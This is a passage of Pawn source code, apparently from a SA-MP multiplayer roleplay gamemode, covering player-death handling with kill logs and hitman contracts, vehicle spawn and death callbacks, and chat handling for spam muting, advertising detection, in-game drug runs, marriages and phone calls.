			format(PlayerInfo[playerid][pKillLog1], 128, "%s", PlayerInfo[playerid][pKillLog0]);
			format(PlayerInfo[playerid][pKillLog0], 128, "(%d:%d:%d) %s killed me with %s", hour,minute,second,GetPlayerNameEx(killerid), weaponname);

			format(PlayerInfo[killerid][pKillLog9], 128, "%s", PlayerInfo[killerid][pKillLog8]);
			format(PlayerInfo[killerid][pKillLog8], 128, "%s", PlayerInfo[killerid][pKillLog7]);
			format(PlayerInfo[killerid][pKillLog7], 128, "%s", PlayerInfo[killerid][pKillLog6]);
			format(PlayerInfo[killerid][pKillLog6], 128, "%s", PlayerInfo[killerid][pKillLog5]);
			format(PlayerInfo[killerid][pKillLog5], 128, "%s", PlayerInfo[killerid][pKillLog4]);
			format(PlayerInfo[killerid][pKillLog4], 128, "%s", PlayerInfo[killerid][pKillLog3]);
			format(PlayerInfo[killerid][pKillLog3], 128, "%s", PlayerInfo[killerid][pKillLog2]);
			format(PlayerInfo[killerid][pKillLog2], 128, "%s", PlayerInfo[killerid][pKillLog1]);
			format(PlayerInfo[killerid][pKillLog1], 128, "%s", PlayerInfo[killerid][pKillLog0]);
			if(JustSuicided[playerid]) {
				JustSuicided[playerid] = 0;
				format(PlayerInfo[killerid][pKillLog0], 128, "(%d:%d:%d) %s commited suicide", hour,minute,second, GetPlayerNameEx(killerid));
			}
			else {
				format(PlayerInfo[killerid][pKillLog0], 128, "(%d:%d:%d) %s killed %s with %s", hour,minute,second, GetPlayerNameEx(killerid), GetPlayerNameEx(playerid), weaponname);
			}

		 	mysql_format(sqldb,szQuery, sizeof(szQuery), "INSERT INTO kills (killerID, killedID, killTS, killText) VALUES(%d, %d, %d, '%s')", PlayerInfo[killerid][pID], PlayerInfo[playerid][pID], gettime(), PlayerInfo[killerid][pKillLog0]);
		 	mysql_tquery(sqldb,szQuery);
	 	}
	} else {
	    if(GetPVarInt(playerid, "PBM") > 0) {
			format(string, sizeof(string), "%s has died.", GetPlayerNameEx(playerid));
			foreach(Player, i) {
			    if(GetPVarInt(playerid, "PBM") == GetPVarInt(i, "PBM"))
			        SendClientMessage(i, COLOR_RED, string);
			}
		}
	}

	if(GetPVarType(playerid, "SpecOff"))
	{
		SpawnPlayer(playerid);
		return 1;
	}

	if(PlayerDraggedBy[playerid] != INVALID_PLAYER_ID) {
		IsCopDragging[PlayerDraggedBy[playerid]] = INVALID_PLAYER_ID;
	}

	if(IsPlayerAttachedObjectSlotUsed(playerid, 0))
		RemovePlayerAttachedObject(playerid, 0);

	pTazer[playerid] = 0;
	InsideShamal[playerid] = INVALID_VEHICLE_ID;
	DeletePVar(playerid, "SpeedRadar");
 	DeletePVar(playerid, "UsingSprunk");
	DeletePVar(playerid, "usingfirstaid");
	KillTimer(GetPVarInt(playerid, "firstaid5"));
	PlayerCuffed[playerid] = 0;
	PlayerCuffedTime[playerid] = 0;
	DeletePVar(playerid, "PlayerCuffed");
	IsCopDragging[playerid] = INVALID_PLAYER_ID;
	PlayerDraggedBy[playerid] = INVALID_PLAYER_ID;
	PlayerDragged[playerid] = 0;

	if(GetPVarInt(playerid, "Injured") == 1)
	{
     	SendClientMessage(playerid, COLOR_WHITE, "You appear to be stuck in limbo, medics have failed to revive you.");
 		KillEMSQueue(playerid);
	    ResetPlayerWeaponsEx(playerid);

   		new Float:X, Float:Y, Float:Z;
		new Float:health;
		GetPlayerHealth(playerid, health);
		SetPlayerHealth(playerid, health-5);
		GetPlayerPos(playerid, X, Y, Z);
		SetPlayerPos(playerid, X, Y, Z+5);
	    return 1;
	}

	// Determine if the player is in onplayerdeath
	SetPVarInt(playerid, "OPD", 1);

	if(GetPVarInt(playerid, "MovingStretcher") != -1)
	{
	    KillTimer(GetPVarInt(playerid, "TickEMSMove"));
	    DeletePVar(GetPVarInt(playerid, "MovingStretcher"), "OnStretcher");
	    SetPVarInt(playerid, "MovingStretcher", -1);
	}

	if(IsPlayerConnected(Mobile[playerid]))
	{
		SendClientMessage(Mobile[playerid],  COLOR_GRAD2, "The line went dead.");
		format(string, sizeof(string), "* %s puts away their cellphone.", GetPlayerNameEx(Mobile[playerid]));
		ProxDetector(30.0, Mobile[playerid], string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		CellTime[Mobile[playerid]] = 0;
		Mobile[Mobile[playerid]] = INVALID_PLAYER_ID;
	}
	Mobile[playerid] = INVALID_PLAYER_ID;
	CellTime[playerid] = 0;

	foreach(Player, i)
	{
		if(EMSAccepted[i] == playerid)
		{
			EMSAccepted[i] = INVALID_PLAYER_ID;
			GameTextForPlayer(i, "~w~EMS Caller~n~~r~Has Died", 5000, 1);
			EMSCallTime[i] = 0;
			DisablePlayerCheckpoint(i);
		}
	}

	if(GetPVarInt(playerid, "EventToken") == 0)
	{
	    if(GetPVarInt(playerid, "PBM") < 1)
		{
		    if(PlayerInfo[playerid][pJailTime] == 0)
		    {
				new Float:X, Float:Y, Float:Z;
				GetPlayerPos(playerid, X, Y, Z);
				SetSpawnInfo(playerid, 0, PlayerInfo[playerid][pSkin], X, Y, Z, 1.0, -1, -1, -1, -1, -1, -1);

		    	if(AdminDuty[playerid] != 1 && GetPVarType(playerid, "posX") == 0)
		    	{
					SetPVarInt(playerid, "Injured", 1);

					new Float:mX, Float:mY, Float:mZ;
					GetPlayerPos(playerid, mX, mY, mZ);

					SetPVarFloat(playerid, "MedicX", mX);
					SetPVarFloat(playerid, "MedicY", mY);
					SetPVarFloat(playerid, "MedicZ", mZ);
					SetPVarInt(playerid, "MedicVW", GetPlayerVirtualWorld(playerid));
					SetPVarInt(playerid, "MedicInt", GetPlayerInterior(playerid));
		    	}
		    	else
		    	{
					if(GetPVarType(playerid, "posX") != 0)
						return SpawnPlayer(playerid);

					SetPVarInt(playerid, "AdminDeathVW", GetPlayerVirtualWorld(playerid));
					SetPVarInt(playerid, "AdminDeathInt", GetPlayerInterior(playerid));

					SpawnPlayer(playerid);
				}
			}
		}
	}

	if(GetPVarInt(playerid, "Injured") == 0)
	{
		if(GetPVarInt(playerid, "EventToken") >= 1 || GetPVarInt(playerid, "PBM") > 0)
		{
			ResetPlayerWeapons(playerid);
		}
		else
		{
			ResetPlayerWeaponsEx(playerid);
		}
	}

	if(PlayerInfo[killerid][pAdmin] < 6)
	{
	    if(reason == 49)
	    {
	    	format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) has possibly just car rammed %s (ID %d) to death.", GetPlayerNameEx(killerid), killerid, GetPlayerNameEx(playerid), playerid);
	    	ABroadCast(COLOR_YELLOW, string, 1);
	    	//print(string);
	    }
	    if(reason == 50)
	    {
	        if(IsAHelicopter(GetPlayerVehicleID(killerid)))
	        {
	    		format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) has possibly just helibladed %s (ID %d).", GetPlayerNameEx(killerid), killerid, GetPlayerNameEx(playerid), playerid);
	    		ABroadCast(COLOR_YELLOW, string, 1);
	    		//print(string);
	    	}
	    	else
	    	{
	    	    if(GetPlayerWeapon(killerid) != 32 || GetPlayerWeapon(killerid) != 28 || GetPlayerWeapon(killerid) != 29)
	    	    {
	    			format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) has possibly just carparked %s (ID %d) to death.", GetPlayerNameEx(killerid), killerid, GetPlayerNameEx(playerid), playerid);
	    			ABroadCast(COLOR_YELLOW, string, 1);
	    			//print(string);
	    		}
	    		else
	    		{
	    			format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) has possibly just drivershot %s (ID %d) to death.", GetPlayerNameEx(killerid), killerid, GetPlayerNameEx(playerid), playerid);
	    			ABroadCast(COLOR_YELLOW, string, 1);
	    			//print(string);
	    		}
	    	}
	    }
	}

	if(gPlayerCheckpointStatus[playerid] > 4 && gPlayerCheckpointStatus[playerid] < 11)
	{
		DisablePlayerCheckpoint(playerid);
		gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
	}

	ClearCrime(playerid);
	if(PlayerInfo[playerid][pHeadValue] >= 1) {
		if(IsPlayerConnected(killerid)) {
			if(GoChase[killerid] == playerid) {
				new
					killer[MAX_PLAYER_NAME],
					name2[MAX_PLAYER_NAME],
					name[MAX_PLAYER_NAME];

				new takemoney = PlayerInfo[playerid][pHeadValue] / 4 * 2;
			 	name = GetPlayerNameEx(playerid);
				killer = GetPlayerNameEx(killerid);
				GivePlayerCash(killerid, takemoney);
				GivePlayerCash(playerid, -takemoney);
				format(string,sizeof(string),"Hitman %s has fulfilled the contract on %s and collected $%d.",killer,name,PlayerInfo[playerid][pHeadValue] / 4 * 2);
				SendFamilyMessage(4, COLOR_YELLOW, string);
				format(string,sizeof(string),"You have been critically injured by a hitman and lost $%d.",takemoney);
   				ResetPlayerWeaponsEx(playerid);
				SendClientMessage(playerid, COLOR_YELLOW, string);

				foreach(Player, i) {
				    name2 = GetPlayerNameEx(i);
				    if(!strcmp(PlayerInfo[playerid][pContractBy], name2, true)) {
				        if(!IsPlayerStreamedIn(i, playerid)) {
				        	format(string, sizeof(string), "SMS: %s has been eliminated, Sender: MOLE (555)", name);
							SendClientMessage(i, COLOR_YELLOW, string);
						}
				    }
				}

				PlayerInfo[playerid][pHeadValue] = 0;
				strcpy(PlayerInfo[playerid][pContractBy], "Nobody", 64);
				strcpy(PlayerInfo[playerid][pContractDetail], "None", 64);
				PlayerInfo[killerid][pCHits] += 1;
				GotHit[playerid] = 0;
				GetChased[playerid] = 999;
				GoChase[killerid] = 999;
			}
		}
	}
	if(IsPlayerConnected(killerid)) {
		if(GoChase[playerid] == killerid) {
			new killer[MAX_PLAYER_NAME], name[MAX_PLAYER_NAME], name2[MAX_PLAYER_NAME];
			new takemoney = PlayerInfo[playerid][pHeadValue] / 4 * 2;
			GivePlayerCash(killerid, takemoney);
			name = GetPlayerNameEx(playerid);
			killer = GetPlayerNameEx(killerid);
			format(string,128,"Hitman %s has failed the contract on %s and lost $%d.",name,killer,PlayerInfo[killerid][pHeadValue] / 4 * 2);
			SendFamilyMessage(4, COLOR_YELLOW, string);
			GivePlayerCash(playerid, -takemoney);
		   	format(string,128,"You have just killed a hitman and gained $%d, removing the contact on your head.",PlayerInfo[killerid][pHeadValue] / 4 * 2);
			SendClientMessage(killerid, COLOR_YELLOW, string);

			foreach(Player, i) {
			    name2 = GetPlayerNameEx(i);
			    if(!strcmp(PlayerInfo[killerid][pContractBy], name2, true)) {
			        if(!IsPlayerStreamedIn(i, killerid)) {
			        	format(string, sizeof(string), "SMS: We failed with %s, you can try place another hit on the target, Sender: MOLE (555)", killer);
						SendClientMessage(i, COLOR_YELLOW, string);
					}
			    }
			}

			PlayerInfo[killerid][pHeadValue] = 0;
			strcpy(PlayerInfo[killerid][pContractBy], "Nobody", 64);
			strcpy(PlayerInfo[killerid][pContractDetail], "None", 64);
			PlayerInfo[playerid][pFHits] += 1;
			GotHit[playerid] = 0;
			GetChased[killerid] = 999;
			GoChase[playerid] = 999;
		}
	}
	killerid = INVALID_PLAYER_ID;
	SetPlayerColor(playerid,TEAM_HIT_COLOR);
	return 1;
}

forward DelayedVehHealth(vehicleid);
public DelayedVehHealth(vehicleid) {
	SetVehicleHealth(vehicleid, 2500);
	return 1;
}

public OnVehicleSpawn(vehicleid) {
    VehicleStatus{vehicleid} = 0;
   	TruckContents[vehicleid] = 0;
	VehicleRadioStation[vehicleid] = 0;

	if(LockStatus[vehicleid] == 1) vehicle_lock_doors(vehicleid);
	else vehicle_unlock_doors(vehicleid);

	switch(GetVehicleModel(vehicleid)) {
		case 427, 428, 432, 601, 528: SetTimerEx("DelayedVehHealth", 1000, false, "d", vehicleid);
	}

    new v;
	foreach(Player, i)
	{
	    v = GetPlayerVehicle(i, vehicleid);
	    if(v != -1)
	    {
 			if(PlayerVehicleInfo[i][v][pvId] == vehicleid && GetVehicleModel(vehicleid) != PlayerVehicleInfo[i][v][pvModelId])
	  		{
	   			DestroyVehicle(vehicleid);
	   			VehicleRadioStation[vehicleid] = 0;
				PlayerVehicleInfo[i][v][pvId] = CreateVehicle(PlayerVehicleInfo[i][v][pvModelId], PlayerVehicleInfo[i][v][pvPosX], PlayerVehicleInfo[i][v][pvPosY], PlayerVehicleInfo[i][v][pvPosZ], PlayerVehicleInfo[i][v][pvPosAngle],PlayerVehicleInfo[i][v][pvColor1], PlayerVehicleInfo[i][v][pvColor2], -1);
				if(PlayerVehicleInfo[i][v][pvLocked] == 1) LockPlayerVehicle(i, PlayerVehicleInfo[i][v][pvId], PlayerVehicleInfo[i][v][pvLock]);
	            ChangeVehiclePaintjob(PlayerVehicleInfo[i][v][pvId], PlayerVehicleInfo[i][v][pvPaintJob]);
				ChangeVehicleColor(PlayerVehicleInfo[i][v][pvId], PlayerVehicleInfo[i][v][pvColor1], PlayerVehicleInfo[i][v][pvColor2]);
				LoadPlayerVehicleMods(i, v);
				for(new m = 0; m < MAX_MODS; m++)
	   			{
	   			    if(PlayerVehicleInfo[i][v][pvMods][m] >= 1000 && PlayerVehicleInfo[i][v][pvMods][m] <= 1193)
	   			    {
		   				if(InvalidModCheck(GetVehicleModel(vehicleid), PlayerVehicleInfo[i][v][pvMods][m]))
		      			{
		      				AddVehicleComponent(PlayerVehicleInfo[i][v][pvId], PlayerVehicleInfo[i][v][pvMods][m]);
		      			}
		      			else
		      			{
		      			    //printf("Removing invalid mod %d from %d of %s", PlayerVehicleInfo[i][v][pvMods][m], GetVehicleModel(vehicleid), GetPlayerNameEx(i));
		      			    PlayerVehicleInfo[i][v][pvMods][m] = 0;
		      			}
					}
	      		}
 			}
 			else
			{
				LoadPlayerVehicleMods(i, v);
                ChangeVehiclePaintjob(vehicleid, PlayerVehicleInfo[i][v][pvPaintJob]);
				ChangeVehicleColor(vehicleid, PlayerVehicleInfo[i][v][pvColor1], PlayerVehicleInfo[i][v][pvColor2]);
				for(new m = 0; m < MAX_MODS; m++)
	            {
	                if(PlayerVehicleInfo[i][v][pvMods][m] >= 1000 && PlayerVehicleInfo[i][v][pvMods][m] <= 1193)
	   			    {
			            if(InvalidModCheck(GetVehicleModel(vehicleid), PlayerVehicleInfo[i][v][pvMods][m]))
		                {
		    	            AddVehicleComponent(PlayerVehicleInfo[i][v][pvId], PlayerVehicleInfo[i][v][pvMods][m]);
			            }
			            else
			            {
			                //printf("Removing invalid mod %d from %d of %s", PlayerVehicleInfo[i][v][pvMods][m], GetVehicleModel(vehicleid), GetPlayerNameEx(i));
			                PlayerVehicleInfo[i][v][pvMods][m] = 0;
			            }
					}
	            }
	            if(PlayerVehicleInfo[i][v][pvLocked] == 1) LockPlayerVehicle(i, PlayerVehicleInfo[i][v][pvId], PlayerVehicleInfo[i][v][pvLock]);
			}
			new string[128];
			format(string,sizeof(string),"Your %s has been sent to the location at which you last parked it.",GetVehicleName(vehicleid));
			SendClientMessage(i, COLOR_GRAD1, string);
		}
	}

	if(LockStatus[vehicleid])
	{
		foreach(Player, i)
		{
			if(PlayerInfo[i][pLockCar] == vehicleid)
			{
				PlayerInfo[i][pLockCar] = INVALID_VEHICLE_ID;
			}
		}
	}

	if(VehicleBomb{vehicleid} == 1)
	{
		foreach(Player, i)
		{
			if(PlayerInfo[i][pFaction] == 4 || PlayerInfo[i][pLeader] == 4)
			{
				if(PlacedVehicleBomb[i] == vehicleid)
				{
					VehicleBomb{vehicleid} = 0;
  					PlacedVehicleBomb[i] = INVALID_VEHICLE_ID;
					PickUpC4(i);
					PlayerInfo[i][pC4Used] = 0;
					PlayerInfo[i][pC4Get] = 1;
				}
			}
		}
	}
	return 1;
}

public OnVehicleDeath(vehicleid, killerid)
{
    VehicleStatus{vehicleid} = 1;
   	TruckContents[vehicleid] = 0;
	VehicleRadioStation[vehicleid] = 0;
	foreach(Player, i)
	{
	    if(InsideShamal[i] == vehicleid)
	    {
     		new Float:X, Float:Y, Float:Z;
  			new Float:XB, Float:YB, Float:ZB;
			GetVehiclePos(InsideShamal[i], X, Y, Z);
			SetPlayerPos(i, X-4, Y-2.3, Z);
			GetVehiclePos(InsideShamal[i], XB, YB, ZB);
			if(ZB > 50.0)
			{
				PlayerInfo[i][pAGuns][GetWeaponSlot(46)] = 46;
				GivePlayerValidWeapon(i, 46, 60000);
			}
   			PlayerInfo[i][pVW] = 0;
			SetPlayerVirtualWorld(i, 0);
			PlayerInfo[i][pInt] = 0;
			SetPlayerInterior(i, 0);
			SendClientMessage(i, COLOR_WHITE, "The airplane has been damaged, you can't be inside of it!");
			InsideShamal[i] = INVALID_VEHICLE_ID;
	    }
	}
	return 1;
}

public OnPlayerText(playerid, text[])
{
	if(gPlayerLogged[playerid] != 1)
	{
		SendClientMessage(playerid, COLOR_RED, "You're not logged in.");
		return 0;
	}
	if(PlayerInfo[playerid][pTut] == 0)
	{
		return 0;
	}

	new
		sendername[MAX_PLAYER_NAME],
		giveplayer[MAX_PLAYER_NAME],
		string[128],
		vehicleid = GetPlayerVehicleID(playerid);

	playerLastTyped[playerid] = 0;

	if(TextSpamUnmute[playerid] != 0)
	{
		if(PlayerInfo[playerid][pAdmin] < 6)
		{
			SendClientMessage(playerid, COLOR_WHITE, "You're muted from submitting text right now.");
			return 0;
		}
	}

	if(PlayerInfo[playerid][pAdmin] < 6)
	{
		TextSpamTimes[playerid]++;

		if(TextSpamTimes[playerid] == 5)
		{
			TextSpamTimes[playerid] = 0;
			TextSpamUnmute[playerid] = 10;
			SendClientMessage(playerid, COLOR_YELLOW, "You have been muted automatically for spamming. Please wait 10 seconds and try again.");
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_FLOODPROTECTION);
			return 0;
		}
	}

	if(strfind(text, "|", true) != -1)
	{
	    SendClientMessage(playerid, COLOR_RED, "You can't use the '|' character in text.");
		return 0;
	}

	if(PlayerInfo[playerid][pAdmin] < 4)
	{
		if(strfind(text, ":", true) != -1)
		{
			new
				i_numcount,
				i_period,
				i_pos;

			while(text[i_pos]) {
				if('0' <= text[i_pos] <= '9') i_numcount++;
				else if(text[i_pos] == '.') i_period++;
				i_pos++;
			}
			if(i_numcount >= 8 && i_period >= 3) {
				format(string,sizeof(string),"Warning: %s may be server advertising: '%s'.", GetPlayerNameEx(playerid),text);
				ABroadCast(COLOR_RED, string, 2);
				Log("logs/hack.log", string);
				return 0;
			}
		}
	}

	if(GetPVarInt(playerid, "ChoosingDrugs") == 1)
	{
		if(strcmp("pot", text, true) == 0)
		{
			new mypoint = -1;
			for (new i=0; i<MAX_POINTS; i++)
			{
				if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[i][Pointx], Points[i][Pointy], Points[i][Pointz]) && strcmp(Points[i][Name], "Drug Factory", true) == 0)
				{
					mypoint = i;
				}
			}
			if(mypoint == -1)
			{
				SendClientMessage(playerid, COLOR_GREY, "You're not at the Drug Factory!");
				return 0;
			}
			if(PlayerInfo[playerid][pCrates])
			{
				SendClientMessage(playerid, COLOR_GREY, "   You can't hold any more Drug Crates!");
				SetPVarInt(playerid, "ChoosingDrugs", 0);
				return 0;
			}
	 		if(CheckPointCheck(playerid))
 			{
  				SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");
    			return 0;
  			}
			if(GetPlayerCash(playerid) >= 100)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE,"* You bought some Drug Crates for $100.");
				GivePlayerCash(playerid, -100);
				PlayerInfo[playerid][pCrates] = 1;
				SetPVarInt(playerid, "CrateDeliver", 1);
				SetPVarInt(playerid, "ChoosingDrugs", 0);
				SetPVarInt(playerid, "tpDrugRunTimer", 45);
				SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPDRUGRUNTIMER);
				SetPlayerCheckpoint(playerid, 2166.3772,-1675.3829,15.0859, 3);
				for(new i = 0; i < sizeof(FamilyInfo); i++)
				{
					if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
					{
						FamilyInfo[i][FamilyBank] += 50;
					}
				}
				return 0;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY," You can't afford the $100!");
				SetPVarInt(playerid, "ChoosingDrugs", 0);
   				return 0;
			}
		}
		else if(strcmp("crack", text, true) == 0)
		{
			new mypoint = -1;
			for (new i=0; i<MAX_POINTS; i++)
			{
				if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[i][Pointx], Points[i][Pointy], Points[i][Pointz]) && strcmp(Points[i][Name], "Drug Factory", true) == 0)
				{
					mypoint = i;
				}
			}
			if(mypoint == -1)
			{
				SendClientMessage(playerid, COLOR_GREY, "You're not at the Drug Factory!");
				return 0;
			}
			if(PlayerInfo[playerid][pCrates])
			{
				SendClientMessage(playerid, COLOR_GREY, "   You can't hold any more drug crates!");
				SetPVarInt(playerid, "ChoosingDrugs", 0);
				return 0;
			}
 			if(CheckPointCheck(playerid))
 			{
  				SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");
    			return 0;
  			}
			if(GetPlayerCash(playerid) >= 100)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE,"* You bought some drug crates for $100.");
				GivePlayerCash(playerid, -100);
				PlayerInfo[playerid][pCrates] = 1;
				SetPVarInt(playerid, "CrateDeliver", 2);
				SetPVarInt(playerid, "ChoosingDrugs", 0);
				SetPVarInt(playerid, "tpDrugRunTimer", 45);
				SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPDRUGRUNTIMER);
				SetPlayerCheckpoint(playerid, 2354.2808,-1169.2959,28.0066, 3);
				for(new i = 0; i < sizeof(FamilyInfo); i++)
				{
					if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
					{
						FamilyInfo[i][FamilyBank] += 50;
					}
				}
				return 0;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY," You can't afford the $100!");
				SetPVarInt(playerid, "ChoosingDrugs", 0);
   				return 0;
			}
		}
		else
		{
	 		SendClientMessage(playerid, COLOR_LIGHTRED,"What type of drugs would you like to smuggle? Type 'crack' or 'pot'.");
			return 0;
		}
	}
	if(MarriageCeremoney[playerid] > 0)
	{
		if(strcmp("yes", text, true) == 0)
		{
			if(GotProposedBy[playerid] < 999)
			{
				if(IsPlayerConnected(GotProposedBy[playerid]))
				{
					GetPlayerName(playerid, sendername, sizeof(sendername));
					GetPlayerName(GotProposedBy[playerid], giveplayer, sizeof(giveplayer));
					format(string, sizeof(string), "Priest: %s do you take %s as your lovely wife? (Type 'yes' - anything else will reject the marriage).", giveplayer,sendername);
					SendClientMessage(GotProposedBy[playerid], COLOR_WHITE, string);
					MarriageCeremoney[GotProposedBy[playerid]] = 1;
					MarriageCeremoney[playerid] = 0;
					GotProposedBy[playerid] = 999;
					return 0; // Yeah... no more "YES DILDOS SEX RAPE LOL" broadcast to the whole server
				}
				else
				{
					MarriageCeremoney[playerid] = 0;
					GotProposedBy[playerid] = 999;
					return 0;
				}
			}
			else if(ProposedTo[playerid] < 999)
			{
				if(IsPlayerConnected(ProposedTo[playerid]))
				{
					GetPlayerName(playerid, sendername, sizeof(sendername));
					GetPlayerName(ProposedTo[playerid], giveplayer, sizeof(giveplayer));
					if(PlayerInfo[playerid][pSex] == 1 && PlayerInfo[ProposedTo[playerid]][pSex] == 2)
					{
						format(string, sizeof(string), "Priest: %s and %s i pronounce you now... Husband & Wife, you may kiss the bride.", sendername, giveplayer);
						SendClientMessage(playerid, COLOR_WHITE, string);
				   		format(string, sizeof(string), "Priest: %s and %s i pronounce you now... Husband & Wife, you may kiss the groom.", giveplayer, sendername);
						SendClientMessage(ProposedTo[playerid], COLOR_WHITE, string);
						format(string, sizeof(string), "Marriage News: We have a new lovely couple! %s & %s have been married.", sendername, giveplayer);
						SendClientMessageToAllEx(COLOR_WHITE, string);
					}
					else if(PlayerInfo[playerid][pSex] == 1 && PlayerInfo[ProposedTo[playerid]][pSex] == 1)
					{
						format(string, sizeof(string), "Priest: %s and %s i pronounce you now... Husband & Husband, you may kiss the bride.", sendername, giveplayer);
						SendClientMessage(playerid, COLOR_WHITE, string);
				   		format(string, sizeof(string), "Priest: %s and %s i pronounce you now... Husband & Husband, you may kiss the groom.", giveplayer, sendername);
						SendClientMessage(ProposedTo[playerid], COLOR_WHITE, string);
						format(string, sizeof(string), "Marriage News: We have a new gay couple! %s & %s have been married.", sendername, giveplayer);
						SendClientMessageToAllEx(COLOR_WHITE, string);
					}
					else if(PlayerInfo[playerid][pSex] == 2 && PlayerInfo[ProposedTo[playerid]][pSex] == 2)
					{
						format(string, sizeof(string), "Priest: %s and %s i pronounce you now... Wife & Wife, you may kiss the Bride.", sendername, giveplayer);
						SendClientMessage(playerid, COLOR_WHITE, string);
				   		format(string, sizeof(string), "Priest: %s and %s i pronounce you now... Wife & Wife, you may kiss the Groom.", giveplayer, sendername);
						SendClientMessage(ProposedTo[playerid], COLOR_WHITE, string);
						format(string, sizeof(string), "Marriage News: We have a new lesbian couple! %s & %s have been married.", sendername, giveplayer);
						SendClientMessageToAllEx(COLOR_WHITE, string);
					}
					//MarriageCeremoney[ProposedTo[playerid]] = 1;
					MarriageCeremoney[ProposedTo[playerid]] = 0;
					MarriageCeremoney[playerid] = 0;
					format(PlayerInfo[ProposedTo[playerid]][pMarriedTo], MAX_PLAYER_NAME, "%s", sendername);
					format(PlayerInfo[playerid][pMarriedTo], MAX_PLAYER_NAME, "%s", giveplayer);
					GivePlayerCash(playerid, - 10000);
					PlayerInfo[playerid][pMarried] = 1;
					PlayerInfo[ProposedTo[playerid]][pMarried] = 1;
					ProposedTo[playerid] = 999;
					MarriageCeremoney[playerid] = 0;
					return 0;
				}
				else
				{
					MarriageCeremoney[playerid] = 0;
					ProposedTo[playerid] = 999;
					return 0;
				}
			}
		}
		else
		{
			if(GotProposedBy[playerid] < 999)
			{
				if(IsPlayerConnected(GotProposedBy[playerid]))
				{
					format(string, sizeof(string), "* You didn't want to marry %s, no 'yes' was said.", GetPlayerNameEx(GotProposedBy[playerid]));
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string, sizeof(string), "* %s did't want to marry you, no 'yes' was said.",GetPlayerNameEx(playerid));
					SendClientMessage(GotProposedBy[playerid], COLOR_YELLOW, string);
					return 0;
				}
				else
				{
					MarriageCeremoney[playerid] = 0;
					GotProposedBy[playerid] = 999;
					return 0;
				}
			}
			else if(ProposedTo[playerid] < 999)
			{
				if(IsPlayerConnected(ProposedTo[playerid]))
				{
					format(string, sizeof(string), "* You didn't want to marry %s, no 'yes' was said.",GetPlayerNameEx(ProposedTo[playerid]));
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string, sizeof(string), "* %s did't want to marry you, no 'yes' was said.",GetPlayerNameEx(playerid));
					SendClientMessage(ProposedTo[playerid], COLOR_YELLOW, string);
					return 0;
				}
				else
				{
					MarriageCeremoney[playerid] = 0;
					ProposedTo[playerid] = 999;
					return 0;
				}
			}
		}
		return 0;
	}
	if(CallLawyer[playerid] == 111)
	{
		if(strcmp("yes", text, true) == 0)
		{
			format(string, sizeof(string), "** %s is in jail, and needs a lawyer. Go to the Police Station.", GetPlayerNameEx(playerid));
			SendJobMessage(2, TEAM_AZTECAS_COLOR, string);
			SendClientMessage(playerid, COLOR_LIGHTRED, "A message has been sent to all available lawyers, please wait.");
			WantLawyer[playerid] = 0;
			CallLawyer[playerid] = 0;
			return 0;
		}
		else
		{
			SendClientMessage(playerid, COLOR_LIGHTRED, "There is no lawyer available to you anymore. Jail time has started.");
			WantLawyer[playerid] = 0;
			CallLawyer[playerid] = 0;
			return 0;
		}
	}

	if(TalkingLive[playerid] != INVALID_PLAYER_ID) {
		if(PlayerInfo[playerid][pFaction] == 9 || PlayerInfo[playerid][pLeader] == 9) {
			format(string, sizeof(string), "Live News Reporter %s: %s", GetPlayerNameEx(playerid), text);
			ICNews(COLOR_LIGHTGREEN,string);
		} else {
			format(string, sizeof(string), "Live Interview Guest %s: %s", GetPlayerNameEx(playerid), text);
			ICNews(COLOR_LIGHTGREEN,string);
		}
		return 0;
	}

	if(Mobile[playerid] != INVALID_PLAYER_ID)
	{
		format(string, sizeof(string), "(cellphone) %s says: %s", GetPlayerNameEx(playerid), text);
		if(IsPlayerInAnyVehicle(playerid) && IsVehicleWindowsDown[vehicleid] == 1) { //Windows closed.
			format(string, sizeof(string), "[Windows Closed] %s", string);
			ProxDetector(3.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		} else {
			ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
			SetPlayerChatBubble(playerid,text,COLOR_WHITE,20.0,5000);
		}

		if(Mobile[playerid] == 914)
		{
			if(!text[0])
			{
				SendClientMessage(playerid, TEAM_CYAN_COLOR, "Dispatch: Sorry, I don't understand?");
				return 0;
			}
			SendClientMessage(playerid, TEAM_CYAN_COLOR, "Dispatch: We have alerted all units in the area.");
			SendClientMessage(playerid, TEAM_CYAN_COLOR, "Thank you for reporting this incident");

			format(string, sizeof(string), "Dispatch: All Units IA: Caller: %s",GetPlayerNameEx(playerid));
			SendFamilyMessage(3, COLOR_TWPINK, string);
			format(string, sizeof(string), "Dispatch: Incident: %s",text);
			SendFamilyMessage(3, COLOR_TWPINK, string);

			CalledMedics[playerid] = 1;
			MedicsCallTime[playerid] = 60;
			ShowPlayerBeaconForMedics(playerid);
			SendClientMessage(playerid, COLOR_GRAD2, "   They hung up...");
			Mobile[playerid] = INVALID_PLAYER_ID;

			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
